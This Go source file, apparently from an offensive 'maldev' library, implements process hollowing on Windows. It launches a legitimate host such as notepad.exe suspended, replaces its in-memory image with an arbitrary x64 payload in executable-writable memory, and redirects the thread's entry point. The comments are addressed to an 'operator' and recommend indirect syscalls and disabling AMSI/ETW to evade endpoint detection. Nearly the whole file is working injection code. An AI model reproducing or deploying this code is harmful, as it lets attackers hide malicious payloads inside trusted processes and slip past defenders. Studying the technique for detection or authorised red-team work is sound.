//go:build windows

package inject

import (
	"errors"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/evasion/stealthopen"
	"github.com/oioio-space/maldev/pe/parse"
	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Sentinel errors surfaced at the Hollow boundary. Callers branch
// on these via errors.Is when they need per-failure recovery —
// e.g. retry CreateProcess after a UAC denial, fall back to
// section-mapping when NtUnmapViewOfSection refuses.
var (
	ErrHollowSpawn   = errors.New("inject/hollow: target spawn failed")
	ErrHollowParse   = errors.New("inject/hollow: payload PE parse failed")
	ErrHollowUnmap   = errors.New("inject/hollow: NtUnmapViewOfSection failed")
	ErrHollowAlloc   = errors.New("inject/hollow: VirtualAllocEx failed")
	ErrHollowWrite   = errors.New("inject/hollow: WriteProcessMemory failed")
	ErrHollowContext = errors.New("inject/hollow: thread context patch failed")
)

// HollowConfig configures a process-hollowing operation.
//
// The technique (T1055.012) spawns Target SUSPENDED, strips its
// in-memory image via NtUnmapViewOfSection, allocates a fresh
// region at the payload's preferred base, copies the payload's
// headers + sections, patches the suspended thread's RIP to the
// payload entry, and returns the thread for the caller to Resume.
type HollowConfig struct {
	// Target is the absolute path to the host executable used as
	// the masquerading shell — e.g. "C:\\Windows\\System32\\notepad.exe".
	// The target's command-line + image-path stay visible to
	// defender tooling (that's the point of hollowing).
	Target string

	// Payload is the bytes of the PE32+ image to load into the
	// hollowed process. Must be x64; 32-bit payloads under WoW64
	// require a different code path (use the SysWOW64 target +
	// the maldev x86 BOF cross-process loader pattern instead).
	Payload []byte

	// CmdLine optionally overrides the command-line presented to
	// the OS for the host process. Empty = use Target as both
	// image path and command line.
	CmdLine string

	// Caller routes the cross-process Nt* call (NtUnmapViewOfSection)
	// through the operator's chosen *wsyscall.Caller method when
	// non-nil. nil keeps the standard api.ProcNtUnmapViewOfSection
	// path. Same convention as the rest of inject/.
	Caller *wsyscall.Caller

	// Opener is reserved for a future Payload-from-disk read; the
	// current implementation takes Payload as bytes only. nil is
	// safe — the field exists so callers can pre-thread a
	// stealthopen.Opener through the build pipeline.
	Opener stealthopen.Opener
}

// HollowResult is the outcome of a successful Hollow.
//
// Process + Thread handles are returned for the caller to drive —
// the suspended thread MUST be Resumed (or the process terminated)
// to avoid leaking the suspended host. The caller is responsible
// for CloseHandle on both handles when done.
type HollowResult struct {
	PID     uint32
	Process windows.Handle
	Thread  windows.Handle // returned SUSPENDED — caller resumes
	// BaseAddress is where the payload's image landed in the
	// remote process. Equal to the payload's preferred ImageBase
	// when the alloc succeeded at that address; non-preferred
	// allocations would require base-relocation handling, which
	// the current implementation rejects (returns ErrHollowAlloc).
	BaseAddress uintptr
}

// Hollow runs the full hollowing sequence end-to-end and returns
// the suspended host. Failure at any step terminates the spawned
// host before returning so a partial hollow never leaks a zombie
// process.
//
// MITRE ATT&CK: T1055.012 (Process Hollowing).
// Detection level: moderate — the NtUnmapViewOfSection +
// VirtualAllocEx + WriteProcessMemory + SetThreadContext sequence
// on a freshly-spawned suspended process is a well-known EDR
// signature. Pair with SetCaller to route the Nt unmap through an
// indirect syscall, and consider [`evasion/preset`](../../docs/techniques/evasion/preset.md)
// to silence AMSI/ETW before the call.
func Hollow(cfg HollowConfig) (*HollowResult, error) {
	if !payloadIsX64(cfg.Payload) {
		return nil, fmt.Errorf("%w: payload is not a PE32+ x64 image", ErrHollowParse)
	}
	pe, err := parse.FromBytes(cfg.Payload, "hollow-payload")
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrHollowParse, err)
	}
	preferredBase := uintptr(pe.ImageBase())
	entryRVA := uintptr(pe.EntryPoint())

	pi, err := spawnSuspended(cfg.Target, cfg.CmdLine)
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrHollowSpawn, err)
	}
	cleanup := func() {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
	}

	// The suspended main thread carries the target's PEB address
	// in Rdx (Win64 ABI for the initial-thread entry frame). Read
	// PEB.ImageBaseAddress at offset 0x10 to learn where the
	// target's loaded image actually lives — that's what we
	// unmap, NOT the payload's preferred base (those are usually
	// different under ASLR).
	var ctx context64
	ctx.ContextFlags = contextFull
	if r, _, e := api.ProcGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx))); r == 0 {
		cleanup()
		return nil, fmt.Errorf("%w: GetThreadContext: %v", ErrHollowContext, e)
	}
	pebAddr := uintptr(ctx.Rdx)
	var targetBase uintptr
	if err := readRemote(pi.Process, pebAddr+0x10, unsafe.Pointer(&targetBase), unsafe.Sizeof(targetBase)); err != nil {
		cleanup()
		return nil, fmt.Errorf("%w: read PEB.ImageBaseAddress: %v", ErrHollowUnmap, err)
	}

	if err := ntUnmapTargetImage(pi.Process, targetBase, cfg.Caller); err != nil {
		cleanup()
		return nil, fmt.Errorf("%w: %v", ErrHollowUnmap, err)
	}

	sizeOfImage := computeImageSize(pe)
	remoteBase, _, allocErr := api.ProcVirtualAllocEx.Call(
		uintptr(pi.Process), preferredBase, sizeOfImage,
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if remoteBase == 0 {
		// Preferred base taken — fall back to letting the kernel
		// pick. The payload must be position-independent (PIE)
		// for this to actually run; base-relocation handling for
		// non-PIE payloads is a TODO. Most operator tooling
		// (Go binaries, recent C++ toolchains) ships PIE.
		remoteBase, _, allocErr = api.ProcVirtualAllocEx.Call(
			uintptr(pi.Process), 0, sizeOfImage,
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_EXECUTE_READWRITE),
		)
		if remoteBase == 0 {
			cleanup()
			return nil, fmt.Errorf("%w: %v", ErrHollowAlloc, allocErr)
		}
	}

	if err := writePayloadHeaders(pi.Process, remoteBase, cfg.Payload); err != nil {
		cleanup()
		return nil, fmt.Errorf("%w: headers: %v", ErrHollowWrite, err)
	}
	for _, sec := range pe.Sections() {
		if sec.Size == 0 || sec.Offset == 0 {
			continue
		}
		data, err := pe.SectionData(&sec)
		if err != nil {
			cleanup()
			return nil, fmt.Errorf("%w: section %q: %v", ErrHollowWrite, sec.Name, err)
		}
		if err := writeRemote(pi.Process, remoteBase+uintptr(sec.VirtualAddress), data); err != nil {
			cleanup()
			return nil, fmt.Errorf("%w: section %q: %v", ErrHollowWrite, sec.Name, err)
		}
	}

	// Patch PEB.ImageBaseAddress so the payload's runtime self-
	// reference (GetModuleHandle(NULL), TLS init, etc.) resolves
	// to the new base instead of the now-unmapped target base.
	if err := writeRemote(pi.Process, pebAddr+0x10, asBytes(unsafe.Pointer(&remoteBase), unsafe.Sizeof(remoteBase))); err != nil {
		cleanup()
		return nil, fmt.Errorf("%w: patch PEB.ImageBaseAddress: %v", ErrHollowWrite, err)
	}

	ctx.Rip = uint64(remoteBase + entryRVA)
	if r, _, e := api.ProcSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx))); r == 0 {
		cleanup()
		return nil, fmt.Errorf("%w: SetThreadContext: %v", ErrHollowContext, e)
	}

	return &HollowResult{
		PID:         pi.ProcessId,
		Process:     pi.Process,
		Thread:      pi.Thread,
		BaseAddress: remoteBase,
	}, nil
}

// payloadIsX64 checks the PE Machine field directly from raw
// bytes — avoids depending on pe.parse for the gate. Returns
// false for malformed input or any non-AMD64 machine type.
func payloadIsX64(payload []byte) bool {
	if len(payload) < 0x40 {
		return false
	}
	// DOS header signature.
	if payload[0] != 'M' || payload[1] != 'Z' {
		return false
	}
	// e_lfanew at offset 0x3C.
	eLfanew := uint32(payload[0x3C]) | uint32(payload[0x3D])<<8 |
		uint32(payload[0x3E])<<16 | uint32(payload[0x3F])<<24
	if int(eLfanew)+6 > len(payload) {
		return false
	}
	// "PE\0\0" + Machine word (offset 4 from NT header).
	if payload[eLfanew] != 'P' || payload[eLfanew+1] != 'E' ||
		payload[eLfanew+2] != 0 || payload[eLfanew+3] != 0 {
		return false
	}
	machine := uint16(payload[eLfanew+4]) | uint16(payload[eLfanew+5])<<8
	return machine == 0x8664 // IMAGE_FILE_MACHINE_AMD64
}

// readRemote reads `size` bytes from `src` in `hProcess` into the
// buffer at `dst`. Thin wrapper over kernel32!ReadProcessMemory.
func readRemote(hProcess windows.Handle, src uintptr, dst unsafe.Pointer, size uintptr) error {
	var n uintptr
	return windows.ReadProcessMemory(hProcess, src, (*byte)(dst), size, &n)
}

// asBytes views the `size` bytes at `p` as a []byte without
// copying. Caller responsibility: the underlying memory must
// outlive the slice.
func asBytes(p unsafe.Pointer, size uintptr) []byte {
	return unsafe.Slice((*byte)(p), size)
}

// spawnSuspended is the kernel32 CreateProcessW(CREATE_SUSPENDED)
// step shared by hollow + other suspended-spawn-then-modify
// techniques. Returns the populated ProcessInformation. Caller
// is responsible for CloseHandle / TerminateProcess on cleanup.
func spawnSuspended(target, cmdLine string) (windows.ProcessInformation, error) {
	var pi windows.ProcessInformation
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))

	if cmdLine == "" {
		cmdLine = target
	}
	cmd, err := windows.UTF16PtrFromString(cmdLine)
	if err != nil {
		return pi, fmt.Errorf("UTF16PtrFromString: %w", err)
	}
	app, err := windows.UTF16PtrFromString(target)
	if err != nil {
		return pi, fmt.Errorf("UTF16PtrFromString: %w", err)
	}
	if err := windows.CreateProcess(app, cmd, nil, nil, false,
		windows.CREATE_SUSPENDED, nil, nil, &si, &pi); err != nil {
		return pi, err
	}
	return pi, nil
}

// ntUnmapTargetImage strips the target's loaded image at base via
// NtUnmapViewOfSection. Caller-routed when non-nil; kernel32 path
// via api.Proc*.Call otherwise.
func ntUnmapTargetImage(hProcess windows.Handle, base uintptr, caller *wsyscall.Caller) error {
	if caller != nil {
		r, _ := caller.Call("NtUnmapViewOfSection", uintptr(hProcess), base)
		if r != 0 {
			return fmt.Errorf("NTSTATUS 0x%X", uint32(r))
		}
		return nil
	}
	r, _, err := api.ProcNtUnmapViewOfSection.Call(uintptr(hProcess), base)
	if r != 0 {
		return fmt.Errorf("NTSTATUS 0x%X: %w", uint32(r), err)
	}
	return nil
}

// writePayloadHeaders mirrors the payload's PE headers (DOS + NT)
// into the remote allocation. Size is the OptionalHeader's
// SizeOfHeaders if we had access — fall back to the first
// section's VirtualAddress, which the linker guarantees ≥ headers.
func writePayloadHeaders(hProcess windows.Handle, base uintptr, payload []byte) error {
	headerSize := uint32(len(payload))
	// First section's VirtualAddress is the headers' upper bound.
	pe, err := parse.FromBytesFast(payload, "hollow-payload")
	if err == nil {
		secs := pe.Sections()
		if len(secs) > 0 && secs[0].VirtualAddress > 0 && secs[0].VirtualAddress < headerSize {
			headerSize = secs[0].VirtualAddress
		}
	}
	if int(headerSize) > len(payload) {
		headerSize = uint32(len(payload))
	}
	return writeRemote(hProcess, base, payload[:headerSize])
}

// writeRemote is the thin WriteProcessMemory wrapper used by
// hollow. Kernel32-exempt (kept direct rather than threaded
// through the Caller — the operator's Caller targets Nt*, not
// kernel32 IO).
func writeRemote(hProcess windows.Handle, dst uintptr, data []byte) error {
	if len(data) == 0 {
		return nil
	}
	var n uintptr
	return windows.WriteProcessMemory(hProcess, dst, &data[0], uintptr(len(data)), &n)
}

// computeImageSize derives a conservative SizeOfImage for the
// VirtualAllocEx call by summing section VAs + sizes. The real
// OptionalHeader.SizeOfImage isn't exposed by parse.File today;
// this approximation is enough for the alloc to cover every
// section's virtual extent.
func computeImageSize(pe *parse.File) uintptr {
	var top uint32
	for _, s := range pe.Sections() {
		end := s.VirtualAddress + s.VirtualSize
		if end > top {
			top = end
		}
	}
	// Round up to a 4 KB page so VirtualAllocEx never short-changes
	// the last section's slop bytes.
	if top%0x1000 != 0 {
		top += 0x1000 - (top % 0x1000)
	}
	return uintptr(top)
}
